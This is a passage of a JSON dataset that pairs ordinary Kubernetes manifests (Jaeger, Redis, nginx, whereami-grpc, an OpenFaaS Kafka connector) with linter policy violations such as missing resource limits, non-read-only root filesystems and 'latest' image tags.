    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: '{{ .Values.agent.image }}'\n        args:\n        - --reporter.grpc.host-port=jaeger-logzio-collector:14250\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jaeger-agent\" has cpu request 0"
  },
  {
    "id": "11375",
    "manifest_path": "data/manifests/the_stack_sample/sample_4378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: '{{ .Values.agent.image }}'\n        args:\n        - --reporter.grpc.host-port=jaeger-logzio-collector:14250\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jaeger-agent\" has memory limit 0"
  },
  {
    "id": "11376",
    "manifest_path": "data/manifests/the_stack_sample/sample_4381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gitlab-redis\n  namespace: gitlab\nspec:\n  selector:\n    matchLabels:\n      name: gitlab-redis\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: gitlab-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:3.2.4\n        ports:\n        - name: redis\n          containerPort: 6379\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: data\n        livenessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n      volumes:\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "11377",
    "manifest_path": "data/manifests/the_stack_sample/sample_4381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gitlab-redis\n  namespace: gitlab\nspec:\n  selector:\n    matchLabels:\n      name: gitlab-redis\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: gitlab-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:3.2.4\n        ports:\n        - name: redis\n          containerPort: 6379\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: data\n        livenessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n      volumes:\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "11378",
    "manifest_path": "data/manifests/the_stack_sample/sample_4381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gitlab-redis\n  namespace: gitlab\nspec:\n  selector:\n    matchLabels:\n      name: gitlab-redis\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: gitlab-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:3.2.4\n        ports:\n        - name: redis\n          containerPort: 6379\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: data\n        livenessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n      volumes:\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "11379",
    "manifest_path": "data/manifests/the_stack_sample/sample_4381.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: gitlab-redis\n  namespace: gitlab\nspec:\n  selector:\n    matchLabels:\n      name: gitlab-redis\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: gitlab-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:3.2.4\n        ports:\n        - name: redis\n          containerPort: 6379\n        volumeMounts:\n        - mountPath: /var/lib/redis\n          name: data\n        livenessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - redis-cli\n            - ping\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n      volumes:\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "11380",
    "manifest_path": "data/manifests/the_stack_sample/sample_4382.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  namespace: default\n  name: nginx-service\n  labels:\n    app: nginx\nspec:\n  type: LoadBalancer\n  ports:\n  - protocol: TCP\n    port: 80\n  selector:\n    app: nginx\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "11381",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (cyclonus), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "11382",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11383",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cyclonus\" is using an invalid container image, \"mfenwick100/cyclonus:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11384",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyclonus\" does not have a read-only root file system"
  },
  {
    "id": "11385",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cyclonus\" not found"
  },
  {
    "id": "11386",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyclonus\" is not set to runAsNonRoot"
  },
  {
    "id": "11387",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cyclonus\" has cpu request 0"
  },
  {
    "id": "11388",
    "manifest_path": "data/manifests/the_stack_sample/sample_4385.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cyclonus\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - ./cyclonus\n        - generate\n        - --job-timeout-seconds=2\n        name: cyclonus\n        imagePullPolicy: IfNotPresent\n        image: mfenwick100/cyclonus:latest\n      serviceAccount: cyclonus\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cyclonus\" has memory limit 0"
  },
  {
    "id": "11389",
    "manifest_path": "data/manifests/the_stack_sample/sample_4390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: rs-nginx\n  labels:\n    app: rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-app\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-app\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11390",
    "manifest_path": "data/manifests/the_stack_sample/sample_4390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: rs-nginx\n  labels:\n    app: rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-app\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-app\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11391",
    "manifest_path": "data/manifests/the_stack_sample/sample_4390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: rs-nginx\n  labels:\n    app: rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-app\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-app\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "11392",
    "manifest_path": "data/manifests/the_stack_sample/sample_4390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: rs-nginx\n  labels:\n    app: rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-app\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-app\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "11393",
    "manifest_path": "data/manifests/the_stack_sample/sample_4390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: rs-nginx\n  labels:\n    app: rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-app\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-app\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "11394",
    "manifest_path": "data/manifests/the_stack_sample/sample_4390.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: rs-nginx\n  labels:\n    app: rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-app\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-app\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "11395",
    "manifest_path": "data/manifests/the_stack_sample/sample_4391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8142\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11396",
    "manifest_path": "data/manifests/the_stack_sample/sample_4391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8142\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11397",
    "manifest_path": "data/manifests/the_stack_sample/sample_4391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8142\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11398",
    "manifest_path": "data/manifests/the_stack_sample/sample_4391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8142\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11399",
    "manifest_path": "data/manifests/the_stack_sample/sample_4391.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8142\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11400",
    "manifest_path": "data/manifests/the_stack_sample/sample_4394.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api\n  namespace: wardle\nspec:\n  ports:\n  - port: 443\n    protocol: TCP\n    targetPort: 443\n  selector:\n    apiserver: 'true'\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[apiserver:true])"
  },
  {
    "id": "11401",
    "manifest_path": "data/manifests/the_stack_sample/sample_4395.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whereami-grpc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: whereami-grpc\n  template:\n    metadata:\n      labels:\n        app: whereami-grpc\n        version: v1\n    spec:\n      serviceAccountName: whereami-grpc-ksa\n      containers:\n      - name: whereami-grpc\n        image: gcr.io/google-samples/whereami:v1.2.2\n        ports:\n        - name: grpc\n          containerPort: 9090\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 10\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        - name: BACKEND_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_ENABLED\n        - name: BACKEND_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_SERVICE\n        - name: METADATA\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: METADATA\n        - name: ECHO_HEADERS\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: ECHO_HEADERS\n        - name: GRPC_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: GRPC_ENABLED\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11402",
    "manifest_path": "data/manifests/the_stack_sample/sample_4395.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whereami-grpc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: whereami-grpc\n  template:\n    metadata:\n      labels:\n        app: whereami-grpc\n        version: v1\n    spec:\n      serviceAccountName: whereami-grpc-ksa\n      containers:\n      - name: whereami-grpc\n        image: gcr.io/google-samples/whereami:v1.2.2\n        ports:\n        - name: grpc\n          containerPort: 9090\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 10\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        - name: BACKEND_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_ENABLED\n        - name: BACKEND_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_SERVICE\n        - name: METADATA\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: METADATA\n        - name: ECHO_HEADERS\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: ECHO_HEADERS\n        - name: GRPC_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: GRPC_ENABLED\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"whereami-grpc\" does not have a read-only root file system"
  },
  {
    "id": "11403",
    "manifest_path": "data/manifests/the_stack_sample/sample_4395.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whereami-grpc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: whereami-grpc\n  template:\n    metadata:\n      labels:\n        app: whereami-grpc\n        version: v1\n    spec:\n      serviceAccountName: whereami-grpc-ksa\n      containers:\n      - name: whereami-grpc\n        image: gcr.io/google-samples/whereami:v1.2.2\n        ports:\n        - name: grpc\n          containerPort: 9090\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 10\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        - name: BACKEND_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_ENABLED\n        - name: BACKEND_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_SERVICE\n        - name: METADATA\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: METADATA\n        - name: ECHO_HEADERS\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: ECHO_HEADERS\n        - name: GRPC_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: GRPC_ENABLED\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"whereami-grpc-ksa\" not found"
  },
  {
    "id": "11404",
    "manifest_path": "data/manifests/the_stack_sample/sample_4395.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whereami-grpc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: whereami-grpc\n  template:\n    metadata:\n      labels:\n        app: whereami-grpc\n        version: v1\n    spec:\n      serviceAccountName: whereami-grpc-ksa\n      containers:\n      - name: whereami-grpc\n        image: gcr.io/google-samples/whereami:v1.2.2\n        ports:\n        - name: grpc\n          containerPort: 9090\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 10\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        - name: BACKEND_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_ENABLED\n        - name: BACKEND_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_SERVICE\n        - name: METADATA\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: METADATA\n        - name: ECHO_HEADERS\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: ECHO_HEADERS\n        - name: GRPC_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: GRPC_ENABLED\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"whereami-grpc\" is not set to runAsNonRoot"
  },
  {
    "id": "11405",
    "manifest_path": "data/manifests/the_stack_sample/sample_4395.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whereami-grpc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: whereami-grpc\n  template:\n    metadata:\n      labels:\n        app: whereami-grpc\n        version: v1\n    spec:\n      serviceAccountName: whereami-grpc-ksa\n      containers:\n      - name: whereami-grpc\n        image: gcr.io/google-samples/whereami:v1.2.2\n        ports:\n        - name: grpc\n          containerPort: 9090\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 10\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        - name: BACKEND_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_ENABLED\n        - name: BACKEND_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_SERVICE\n        - name: METADATA\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: METADATA\n        - name: ECHO_HEADERS\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: ECHO_HEADERS\n        - name: GRPC_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: GRPC_ENABLED\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"whereami-grpc\" has cpu request 0"
  },
  {
    "id": "11406",
    "manifest_path": "data/manifests/the_stack_sample/sample_4395.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whereami-grpc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: whereami-grpc\n  template:\n    metadata:\n      labels:\n        app: whereami-grpc\n        version: v1\n    spec:\n      serviceAccountName: whereami-grpc-ksa\n      containers:\n      - name: whereami-grpc\n        image: gcr.io/google-samples/whereami:v1.2.2\n        ports:\n        - name: grpc\n          containerPort: 9090\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:9090\n          initialDelaySeconds: 10\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        - name: BACKEND_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_ENABLED\n        - name: BACKEND_SERVICE\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: BACKEND_SERVICE\n        - name: METADATA\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: METADATA\n        - name: ECHO_HEADERS\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: ECHO_HEADERS\n        - name: GRPC_ENABLED\n          valueFrom:\n            configMapKeyRef:\n              name: whereami-grpc-configmap\n              key: GRPC_ENABLED\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"whereami-grpc\" has memory limit 0"
  },
  {
    "id": "11407",
    "manifest_path": "data/manifests/the_stack_sample/sample_4396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kafka\n    component: kafka-connector\n  name: kafka-connector\n  namespace: openfaas\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kafka\n      component: kafka-connector\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: kafka\n        component: kafka-connector\n    spec:\n      containers:\n      - name: kafka\n        image: openfaas/kafka-connector:0.3.4\n        env:\n        - name: gateway_url\n          value: http://gateway.openfaas:8080\n        - name: topics\n          value: faas-request,\n        - name: print_response\n          value: 'true'\n        - name: print_response_body\n          value: 'true'\n        - name: basic_auth\n          value: 'true'\n        - name: secret_mount_path\n          value: /var/secrets/\n        - name: topic_delimiter\n          value: ','\n        - name: asynchronous_invocation\n          value: 'true'\n        volumeMounts:\n        - name: auth\n          readOnly: true\n          mountPath: /var/secrets/\n      volumes:\n      - name: auth\n        secret:\n          secretName: basic-auth\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable secret_mount_path in container \"kafka\" found"
  },
  {
    "id": "11408",
    "manifest_path": "data/manifests/the_stack_sample/sample_4396.yaml",
